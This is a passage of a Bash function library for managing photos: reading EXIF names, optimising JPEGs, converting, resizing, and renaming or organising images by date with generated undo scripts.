        _echo_success 'usage:' "$1" "$2"; _echo_primary 'picture-get-names [file/folder] -v (verbose level) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local file_path
    local source
    local verbose=0

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :vh option; do
            case "${option}" in
                h) _echo_warning 'picture-get-names\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Print image subject names from file exif data\n'
                    _usage 2 14
                    return 0;;
                v) (( verbose++ ));;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check exiftool installation
    #--------------------------------------------------

    if [ -z "$(command -v 'exiftool')" ]; then
        _echo_danger 'error: exiftool not installed, try "sudo apt-get install -y exiftool"\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ -z "${arguments[${LBOUND}]}" ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    # excluding last forward slash if any
    source="$(realpath "${arguments[${LBOUND}]}")"

    #--------------------------------------------------
    # Declare subfunction
    #--------------------------------------------------

    function _get_region_name() {
        if [ "${verbose}" -gt 1 ]; then
            _echo_info "exiftool -RegionName \"$1\" | cut -d: -f2\n"
            exiftool -RegionName "$1" | cut -d: -f2

            return 0
        fi

        local output
        output="$(exiftool -q -q -RegionName "$1" | cut -d: -f2)"

        if [ -z "${output}" ]; then
            return 0
        fi

        if [ "${verbose}" -eq 1 ]; then
            echo "$1" "${output}"

            return 0
        fi

        echo "${output}"
    }

    #--------------------------------------------------
    # Execute command
    #-------------------------------------------------

    if [ -d "${source}" ]; then
        find "${source}" -type f -iregex ".+\.\(jpe?g\|tiff?\|png\|webp\)" | while read -r file_path; do
            _get_region_name "${file_path}"
        done

        return 0
    fi

    if [ -f "${source}" ]; then
        _get_region_name "${source}"

        return 0
    fi

    _echo_danger "error: \"${source}\" is not a valid input\n"
    _usage 2 8
    return 1
}

## Optimize JPG images and remove exif
function picture-jpeg-optimize() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'picture-jpeg-optimize [file/folder] -r (recursive) -h (help)\n'
    }

    #--------------------------------------------------
    # Declare subfunction
    #--------------------------------------------------

    function _jpegoptim() {
        _echo_info "jpegoptim --strip-exif --all-progressive \"$1\"\n"
        jpegoptim --strip-exif --all-progressive "$1"
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local file_path
    local recursive=false
    local source

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :rh option; do
            case "${option}" in
                r) recursive=true;;
                h) _echo_warning 'picture-jpeg-optimize\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Optimize JPG images and remove exif\n'
                    _usage 2 14
                    return 0;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check jpegoptim installation
    #--------------------------------------------------

    if [ -z "$(command -v 'jpegoptim')" ]; then
        _echo_danger 'error: jpegoptim not installed, try "sudo apt-get install -y jpegoptim"\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ -z "${arguments[${LBOUND}]}" ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    # excluding last forward slash if any
    source="$(realpath "${arguments[${LBOUND}]}")"

    #--------------------------------------------------
    # Validate argument type
    #--------------------------------------------------

    # Check source validity
    if [ ! -f "${source}" ] && [ ! -d "${source}" ]; then
        _echo_danger "error: source: \"${source}\" is invalid\n"
        _usage 2 8

        return 1
    fi

    if [ ! -d "${source}" ] && [ "${recursive}" = true ]; then
        _echo_danger "error: source: \"${source}\" is not a valid directory\n"
        _usage 2 8

        return 1
    fi

    #--------------------------------------------------
    # Execute command
    #--------------------------------------------------

    # optimize jpeg
    find "${source}" -type f -iregex ".+\.jpe?g" | while read -r file_path; do
        _echo_info "jpegoptim --strip-exif --all-progressive \"${file_path}\"\n"
        jpegoptim --strip-exif --all-progressive "${file_path}"
    done

    #--------------------------------------------------
    # Execute command
    #-------------------------------------------------

    if [ -d "${source}" ] && [ "${recursive}" = true ]; then
        # Find all files recursively
        find "${source}" -type f -iregex ".+\.jpe?g" | while read -r file_path; do
            _jpegoptim "${file_path}"
        done

        return 0
    fi

    if [ -d "${source}" ]; then
        find "${source}" -maxdepth 1 -type f -iregex ".+\.jpe?g" | while read -r file_path; do
            _jpegoptim "${file_path}"
        done

        return 0
    fi

    if [ -f "${source}" ]; then
        _jpegoptim "${source}"

        return 0
    fi

    _echo_danger "error: \"${source}\" is not a valid input\n"
    _usage 2 8
    return 1
}

## Lists picture exif modified at
function picture-list-exif() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'picture-list-exif [folder] -p (print to csv) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local _basename
    local date
    local datetime
    local extension
    local file_path
    local modified_at
    local print=false
    local source
    local time

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :hp option; do
            case "${option}" in
                p) print=true;;
                h) _echo_warning 'picture-list-exif\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Lists picture exif modified at\n'
                    _usage 2 14
                    return 0;;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check exiftool installation
    #--------------------------------------------------

    if [ -z "$(command -v 'exiftool')" ]; then
        _echo_danger 'error: exiftool not installed, try "sudo apt-get install -y exiftool"\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ -z "${arguments[${LBOUND}]}" ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    # excluding last forward slash if any
    source="$(realpath "${arguments[${LBOUND}]}")"

    #--------------------------------------------------
    # Validate argument type
    #--------------------------------------------------

    if [ ! -d "${source}" ]; then
        _echo_danger "error: \"${source}\" is not a valid directory\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------

    if [ "${print}" = true ]; then
        # print header
        printf '%s\t%s\t%s\t%s\n' 'file_path' 'datetime' 'modified_at' 'modified_at_exif' > "${source}/picture-list-exif.csv"
    fi

    # sort -t '\0' -n => sort output alphabetically
    find "${source}" -type f -iregex '.+\.\(3g2\|3gp\|aax\|ai\|arw\|asf\|avi\|cr2\|cr3\|crm\|crw\|cs1\|dcp\|dng\|dr4\|dvb\|eps\|erf\|exif\|exv\|f4a\|f4v\|fff\|flif\|gif\|gpr\|hdp\|icc\|iiq\|ind\|jng\|jp2\|jpeg\|jpg\|m4a\|m4v\|mef\|mie\|mng\|mod\|mos\|mov\|mp4\|mpeg\|mpg\|mpo\|mqv\|mrw\|nef\|nrw\|orf\|pbm\|pdf\|pef\|pgm\|png\|png\|ppm\|ps\|psb\|psd\|qtif\|raf\|raw\|rw2\|rwl\|sr2\|srw\|thm\|tiff\|vrd\|wdp\|wmv\|x3f\|xmp\)$' | while read -r file_path; do

        # get datetime from exif tag
        # -P  Preserve file modification date/time
        # -m  Ignore minor errors and warnings
        # -s3 print values only (no tag names)
        modified_at_EXIF="$(exiftool -m -P -s3 -d '%Y-%m-%d %H:%M:%S' -DateTimeOriginal "${file_path}")"

        # get datetime from modification date
        modified_at="$(date '+%Y-%m-%d %H:%M:%S' -r "${file_path}")"

        # get datetime from file name
        # get extension including dot
        extension="$(echo "${file_path}" | grep -oE '\.[a-zA-Z0-9]+$')"
        # basename without extension truncated to 19 characters
        _basename="$(basename "${file_path}" "${extension}" | cut -c1-19)"

        # convert string to date
        date="$(echo "${_basename}" | cut -d_ -f1)"

        # convert string to time (empty if invalid)
        time="$(date -d"$(echo "${_basename}" | cut -d_ -f2 | tr '-' ':')" '+%H:%M:%S' 2>/dev/null)"

        datetime="$(date -d"${date} ${time}" '+%Y-%m-%d %H:%M:%S' 2>/dev/null)"

        # print result
        if [ "${datetime}" == "${modified_at}" ] && [ "${datetime}" == "${modified_at_EXIF}" ] && [ "${modified_at}" == "${modified_at_EXIF}" ]; then
            # print in green when datetime is unchanged
            printf '\033[0;32m%s\t%s\t%s\t%s\033[0m\n' "${file_path}" "${datetime}" "${modified_at}" "${modified_at_EXIF}"
        else
            # print in red when datetime is different
            printf '\033[0;31m%s\t%s\t%s\t%s\033[0m\n' "${file_path}" "${datetime}" "${modified_at}" "${modified_at_EXIF}"
        fi

        if [ "${print}" = true ]; then
            printf '%s\t%s\t%s\t%s\n' "${file_path}" "${datetime}" "${modified_at}" "${modified_at_EXIF}" >> "${source}/picture-list-exif.csv"
        fi
    done

    if [ "${print}" = true ]; then
        # open with sublime text by default
        if [ -x "$(command -v subl)" ]; then
            _echo_info "subl \"${source}/picture-list-exif.csv\"\n"
            subl "${source}/picture-list-exif.csv"
        else
            _echo_info "${VISUAL} \"${source}/picture-list-exif.csv\"\n"
            ${VISUAL} "${source}/picture-list-exif.csv"
        fi
    fi
}

## Organise pictures and videos by last modified date into folders (creates undo script)
function picture-organize() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'picture-organize [folder] -e (use exif) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local destination
    local exif=false
    local file_path
    local filename
    local folder
    local new_path
    local source

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :eh option; do
            case "${option}" in
                e) exif=true;;
                h) _echo_warning 'picture-organize\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Organise pictures and videos by last modified date into folders (creates undo script)\n'
                    _usage 2 14
                    return 0;;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check exiftool installation
    #--------------------------------------------------

    if [ -z "$(command -v 'exiftool')" ] && [ "${exif}" = true ]; then
        _echo_danger 'error: exiftool not installed, try "sudo apt-get install -y exiftool"\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ -z "${arguments[${LBOUND}]}" ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    # excluding last forward slash if any
    source="$(realpath "${arguments[${LBOUND}]}")"

    #--------------------------------------------------
    # Validate argument type
    #--------------------------------------------------

    if [ ! -d "${source}" ]; then
        _echo_danger "error: \"${source}\" is not a valid directory\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------

    _echo_info "echo '#!/bin/bash' > \"${source}/picture-organize_undo.sh\"\n"
    echo '#!/bin/bash' > "${source}/picture-organize_undo.sh"

    # sort -t '\0' -n => sort output alphabetically
    find "${source}" -type f -iregex '.+\.\(3g2\|3gp\|aax\|ai\|arw\|asf\|avi\|cr2\|cr3\|crm\|crw\|cs1\|dcp\|dng\|dr4\|dvb\|eps\|erf\|exif\|exv\|f4a\|f4v\|fff\|flif\|gif\|gpr\|hdp\|icc\|iiq\|ind\|jng\|jp2\|jpeg\|jpg\|m4a\|m4v\|mef\|mie\|mng\|mod\|mos\|mov\|mp4\|mpeg\|mpg\|mpo\|mqv\|mrw\|nef\|nrw\|orf\|pbm\|pdf\|pef\|pgm\|png\|png\|ppm\|ps\|psb\|psd\|qtif\|raf\|raw\|rw2\|rwl\|sr2\|srw\|thm\|tiff\|vrd\|wdp\|wmv\|x3f\|xmp\)$' | while read -r file_path; do
        # cache filename
        filename="$(basename "${file_path}")"

        if [ "${exif}" = true ]; then
            # get datetime from exif tag
            # -P  Preserve file modification date/time
            # -m  Ignore minor errors and warnings
            # -s3 print values only (no tag names)
            folder="$(exiftool -m -P -s3 -d '%Y-%m' -DateTimeOriginal "${file_path}")"
        else
            # get new folder name from file date last modified
            folder="$(date '+%Y-%m' -r "${file_path}")"
        fi

        # create destination folder when not found
        destination="${source}/${folder}"
        if [ ! -d "${destination}" ]; then
            _echo_info "mkdir \"${destination}\"\n"
            mkdir "${destination}"
        fi

        new_path="${destination}/${filename}"

        # log action in undo script
        echo "mv -vn \"${new_path}\" \"${file_path}\"" >> "${source}/picture-organize_undo.sh"

        # move file verbose no overwrite
        mv -vn "${file_path}" "${new_path}"
    done
}

## Convert PNG images to JPG
function picture-png2jpg() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'picture-png2jpg [file/folder] -r (recursive) -h (help)\n'
    }

    #--------------------------------------------------
    # Declare subfunction
    #--------------------------------------------------

    function _convert() {
        # $1 = file_name

        local BASENAME
        local EXTENSION
        local NEW_FILE_PATH

        # get extension including dot
        EXTENSION=$(echo "$1" | grep -oE '\.[a-zA-Z0-9]+$')

        # basename without extension
        BASENAME="$(basename "$1" "${EXTENSION}")"

        NEW_FILE_PATH="$(dirname "$1")/${BASENAME}.jpg"

        # convert to jpeg
        _echo_info "convert \"$1\" \"${NEW_FILE_PATH}\"\n"
        convert "$1" "${NEW_FILE_PATH}"
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local file_path
    local recursive=false
    local source

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :rh option; do
            case "${option}" in
                r) recursive=true;;
                h) _echo_warning 'picture-png2jpg\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Convert PNG images to JPG\n'
                    _usage 2 14
                    return 0;;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check imagemagick installation
    #--------------------------------------------------

    if [ -z "$(command -v 'convert')" ]; then
        _echo_danger 'error: imagemagick not installed, try "sudo apt-get install -y imagemagick"\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ -z "${arguments[${LBOUND}]}" ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    # excluding last forward slash if any
    source="$(realpath "${arguments[${LBOUND}]}")"

    #--------------------------------------------------
    # Validate argument type
    #--------------------------------------------------

    # Check source validity
    if [ ! -f "${source}" ] && [ ! -d "${source}" ]; then
        _echo_danger "error: source: \"${source}\" is invalid\n"
        _usage 2 8

        return 1
    fi

    if [ ! -d "${source}" ] && [ "${recursive}" = true ]; then
        _echo_danger "error: source: \"${source}\" is not a valid directory\n"
        _usage 2 8

        return 1
    fi

    #--------------------------------------------------
    # Execute command
    #-------------------------------------------------

    if [ -d "${source}" ] && [ "${recursive}" = true ]; then
        # Find all files recursively
        find "${source}" -type f -name '*.png' | while read -r file_path; do
            _convert "${file_path}"
        done

        return 0
    fi

    if [ -d "${source}" ]; then
        find "${source}" -maxdepth 1 -type f -name '*.png' | while read -r file_path; do
            _convert "${file_path}"
        done

        return 0
    fi

    if [ -f "${source}" ]; then
        _convert "${source}"

        return 0
    fi

    _echo_danger "error: \"${source}\" is not a valid input\n"
    _usage 2 8
    return 1
}

## Rename pictures to date last modified (creates undo script)
function picture-rename-to-datetime() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'picture-rename-to-datetime [folder] -e (use exif) -a (append filename) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local append=false
    local count
    local current_directory
    local exif=false
    local extension
    local file_path
    local modified_at
    local new_basename
    local new_path
    local old_basename
    local source

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :aeh option; do
            case "${option}" in
                a) append=true;;
                e) exif=true;;
                h) _echo_warning 'picture-rename-to-datetime\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Rename pictures to date last modified (creates undo script)\n'
                    _usage 2 14
                    return 0;;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check exiftool installation
    #--------------------------------------------------

    if [ -z "$(command -v 'exiftool')" ] && [ "${exif}" = true ]; then
        _echo_danger 'error: exiftool not installed, try "sudo apt-get install -y exiftool"\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ -z "${arguments[${LBOUND}]}" ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    # excluding last forward slash if any
    source="$(realpath "${arguments[${LBOUND}]}")"

    #--------------------------------------------------
    # Validate argument type
    #--------------------------------------------------

    if [ ! -d "${source}" ]; then
        _echo_danger "error: \"${source}\" is not a valid directory\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------

    _echo_info "echo '#!/bin/bash' > \"${source}/picture-rename-to-datetime_undo.sh\"\n"
    echo '#!/bin/bash' > "${source}/picture-rename-to-datetime_undo.sh"

    # sort -t '\0' -n => sort output alphabetically
    find "${source}" -type f -iregex '.+\.\(3g2\|3gp\|aax\|ai\|arw\|asf\|avi\|cr2\|cr3\|crm\|crw\|cs1\|dcp\|dng\|dr4\|dvb\|eps\|erf\|exif\|exv\|f4a\|f4v\|fff\|flif\|gif\|gpr\|hdp\|icc\|iiq\|ind\|jng\|jp2\|jpeg\|jpg\|m4a\|m4v\|mef\|mie\|mng\|mod\|mos\|mov\|mp4\|mpeg\|mpg\|mpo\|mqv\|mrw\|nef\|nrw\|orf\|pbm\|pdf\|pef\|pgm\|png\|png\|ppm\|ps\|psb\|psd\|qtif\|raf\|raw\|rw2\|rwl\|sr2\|srw\|thm\|tiff\|vrd\|wdp\|wmv\|x3f\|xmp\)$' | sort -t '\0' -n | while read -r file_path; do
        # get current directory excluding last forward slash
        current_directory="$(realpath "$(dirname "${file_path}")")"

        # get extension including dot
        extension="$(echo "${file_path}" | grep -oE '\.[a-zA-Z0-9]+$')"

        old_basename="$(basename "${file_path}" "${extension}")"

        if [ "${exif}" = true ]; then
            # get datetime from exif tag
            # -P  Preserve file modification date/time
            # -m  Ignore minor errors and warnings
            # -s3 print values only (no tag names)
            new_basename="$(exiftool -m -P -s3 -d '%Y-%m-%d_%H-%M-%S' -DateTimeOriginal "${file_path}")"
        else
            _echo_info 'could not retreive data from exif data\n'
            new_basename=''
        fi

        if [ -z "${new_basename}" ]; then
            # cache original date modified from file
            modified_at="$(date '+%Y-%m-%d %H:%M:%S' -r "${file_path}")"

            # generate new basename from datetime
            new_basename="$(date -d"${modified_at}" '+%Y-%m-%d_%H-%M-%S')"
        fi

        if [ "${append}" = true ]; then
            new_basename="${new_basename}_${old_basename}"
        fi

        # generate new path
        new_path="${current_directory}/${new_basename}${extension}"
        # no overwrite: append and increment suffix when file exists
        count=0
        while [ -f "${new_path}" ]; do
            ((count+=1))
            new_path="${current_directory}/${new_basename}_${count}${extension}"
        done

        # rename file
        _echo_info "mv -nv \"${file_path}\" \"${new_path}\"\n"
        mv -nv "${file_path}" "${new_path}"

        # print undo
        printf 'mv -nv "%s" "%s"\n' "${new_path}" "${file_path}" >> "${source}/picture-rename-to-datetime_undo.sh"
    done
}

## Resize images
function picture-resize() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'picture-resize [file/folder] -r (recursive) -s (size default=50%) -h (help)\n'
    }

    #--------------------------------------------------
    # Declare subfunction
    #--------------------------------------------------

    function _resize() {
        _echo_info "convert -resize \"$1\" \"$2\" \"$3\"\n"
        convert -resize "$1" "$2" "$3"
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local file_path
    local recursive=false
    local size='50%'
    local source

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :rs:h option; do
            case "${option}" in
                r) recursive=true;;
                s) size="${OPTARG}";;
                h) _echo_warning 'picture-resize\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Resize images\n'
                    _usage 2 14
                    return 0;;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check convert installation
    #--------------------------------------------------

    if [ -z "$(command -v 'convert')" ]; then
        _echo_danger 'error: imagemagick not installed, try "sudo apt-get install -y imagemagick"\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ -z "${arguments[${LBOUND}]}" ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    if [ "${#arguments[@]}" -gt 2 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    # excluding last forward slash if any
    source="$(realpath "${arguments[${LBOUND}]}")"

    #--------------------------------------------------
    # Validate argument type
    #--------------------------------------------------

    # Check source validity
    if [ ! -f "${source}" ] && [ ! -d "${source}" ]; then
        _echo_danger "error: source: \"${source}\" is invalid\n"
        _usage 2 8

        return 1
    fi

    if [ ! -d "${source}" ] && [ "${recursive}" = true ]; then
        _echo_danger "error: source: \"${source}\" is not a valid directory\n"
        _usage 2 8

        return 1
    fi

    #--------------------------------------------------
    # Sanitize argument
    #--------------------------------------------------

    if [[ "${size}" != *"%" ]]; then
        size="${size}%"
    fi

    #--------------------------------------------------
    # Execute command
    #-------------------------------------------------

    if [ -d "${source}" ] && [ "${recursive}" = true ]; then
        # Find all files recursively
        find "${source}" -type f -iregex ".+\.\(jpe?g\|png\)" | while read -r file_path; do
            _resize "${size}" "${file_path}" "${file_path}"
        done

        return 0
    fi

    if [ -d "${source}" ]; then
        find "${source}" -maxdepth 1 -type f -iregex ".+\.\(jpe?g\|png\)" | while read -r file_path; do
            _resize "${size}" "${file_path}" "${file_path}"
        done

        return 0
    fi

    if [ -f "${source}" ]; then
        _resize "${size}" "${source}" "${source}"

        return 0
    fi

    _echo_danger "error: \"${source}\" is not a valid input\n"
    _usage 2 8
    return 1
}

## Update picture datetime from filename (creates undo script)
function picture-update-datetime() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'picture-update-datetime [folder] -e (update exif) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local _basename
    local date
    local datetime
    local exif=false
    local extension
    local file_path
    local modified_at
    local modified_at_exif
    local source
    local time

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :eh option; do
            case "${option}" in
                e) exif=true;;
                h) _echo_warning 'picture-update-datetime\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Update picture datetime from filename (creates undo script)\n'
                    _usage 2 14
                    return 0;;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check exiftool installation
    #--------------------------------------------------

    if [ -z "$(command -v 'exiftool')" ] && [ "${exif}" = true ]; then
        _echo_danger 'error: exiftool not installed, try "sudo apt-get install -y exiftool"\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ -z "${arguments[${LBOUND}]}" ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    # excluding last forward slash if any
    source="$(realpath "${arguments[${LBOUND}]}")"

    #--------------------------------------------------
    # Validate argument type
    #--------------------------------------------------

    if [ ! -d "${source}" ]; then
        _echo_danger "error: \"${source}\" is not a valid directory\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------

    _echo_info "echo '#!/bin/bash' > \"${source}/picture-update-datetime_undo.sh\"\n"
    echo '#!/bin/bash' > "${source}/picture-update-datetime_undo.sh"

    # sort -t '\0' -n => sort output alphabetically
    find "${source}" -type f -iregex '.+\.\(3g2\|3gp\|aax\|ai\|arw\|asf\|avi\|cr2\|cr3\|crm\|crw\|cs1\|dcp\|dng\|dr4\|dvb\|eps\|erf\|exif\|exv\|f4a\|f4v\|fff\|flif\|gif\|gpr\|hdp\|icc\|iiq\|ind\|jng\|jp2\|jpeg\|jpg\|m4a\|m4v\|mef\|mie\|mng\|mod\|mos\|mov\|mp4\|mpeg\|mpg\|mpo\|mqv\|mrw\|nef\|nrw\|orf\|pbm\|pdf\|pef\|pgm\|png\|png\|ppm\|ps\|psb\|psd\|qtif\|raf\|raw\|rw2\|rwl\|sr2\|srw\|thm\|tiff\|vrd\|wdp\|wmv\|x3f\|xmp\)$' | while read -r file_path; do

        # cache original date modified from file (for undo)
        if [ "${exif}" = true ]; then
            # get datetime from exif tag
            # -P  Preserve file modification date/time
            # -m  Ignore minor errors and warnings
            # -s3 print values only (no tag names)
            modified_at_exif="$(exiftool -m -P -s3 -d '%Y-%m-%d %H:%M:%S' -DateTimeOriginal "${file_path}")"
        fi

        modified_at="$(date '+%Y-%m-%d %H:%M:%S' -r "${file_path}")"

        # formatting input
        # get extension including dot
        extension="$(echo "${file_path}" | grep -oE '\.[a-zA-Z0-9]+$')"
        # basename without extension truncated to 19 characters
        _basename="$(basename "${file_path}" "${extension}" | cut -c1-19)"

        # convert string to date
        date="$(echo "${_basename}" | cut -d_ -f1)"

        # convert string to time (empty if invalid)
        time="$(date -d"$(echo "${_basename}" | cut -d_ -f2 | tr '-' ':')" '+%H:%M:%S' 2>/dev/null)"

        datetime="$(date -d"${date} ${time}" '+%Y-%m-%d %H:%M:%S' 2>/dev/null)"

        # check valid datetime
        if [ -z "${datetime}" ]; then
            _echo_danger "error: invalid datetime: ${date} ${time}\n"
            continue
        fi

        if [ "${exif}" = true ]; then
            # update file exif data
            _echo_info "exiftool \"${file_path}\" -DateTimeOriginal=\"${datetime}\" -overwrite_original\n"
            exiftool "${file_path}" -P -DateTimeOriginal="${datetime}" -overwrite_original

            # print undo
